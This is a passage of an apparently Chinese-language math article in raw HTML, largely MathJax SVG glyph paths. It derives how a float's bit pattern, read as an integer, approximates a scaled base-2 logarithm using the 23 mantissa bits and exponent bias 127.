26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(14052.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(15052.6,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(16640.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(17640.5,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g></g></g></svg></mjx-container></span></p>
<h5 id="重新解释浮点数">重新解释浮点数</h5>
<p>现在，基于这个近似，我们定义 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.477ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3304.7 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2014.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span>（浮点数的尾数位数）和 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="8.128ex" height="1.731ex" role="img" focusable="false" viewBox="0 -683 3592.6 765"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(1036.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2092.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container></span>（指数偏置），当我们将 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span> 的位模式重新解释为整数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.098ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 927.5 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span> 时（符号位仍保留），可以得到： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="80.852ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 35736.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(1205.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2261,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(3164.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(4164.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4553.5,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(5729.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(6729.4,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(7710.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(8710.8,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(10076.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10743.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(11798.8,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(12702.1,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(13702.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(14091.3,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(15267,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(16267.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(17854.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(18855.1,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(19648.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(20648.5,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(21629.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(22630,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 